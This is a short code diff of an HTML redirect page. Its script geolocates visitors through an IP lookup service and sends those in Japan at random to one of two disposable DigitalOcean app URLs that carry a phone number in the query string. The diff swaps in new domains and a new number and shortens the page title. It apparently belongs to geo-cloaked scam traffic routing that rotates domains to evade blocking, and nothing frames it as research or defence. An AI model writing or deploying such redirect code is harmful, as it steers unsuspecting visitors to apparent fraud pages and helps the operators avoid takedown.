@@ -4,7 +4,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Redirecting...</title>
+<title>Red...</title>
 
 <script>
 fetch("https://ipwho.is/")
@@ -18,8 +18,8 @@ fetch("https://ipwho.is/")
 
     if (countryCode === "JP") {
       (function () {
-        const domainA = "https://monkfish-app-ckol4.ondigitalocean.app/?Anph=(050)-3097-4456";
-        const domainB = "https://orca-app-ir9qn.ondigitalocean.app/?Anph=(050)-3097-4456";
+        const domainA = "https://sea-lion-app-k9gmz.ondigitalocean.app/?Anph=(0101)-21735-08134";
+        const domainB = "https://seal-app-a7tjq.ondigitalocean.app/?Anph=(0101)-21735-08134";
 
         // Random number between 0 and 1
         if (Math.random() < 0.5) {
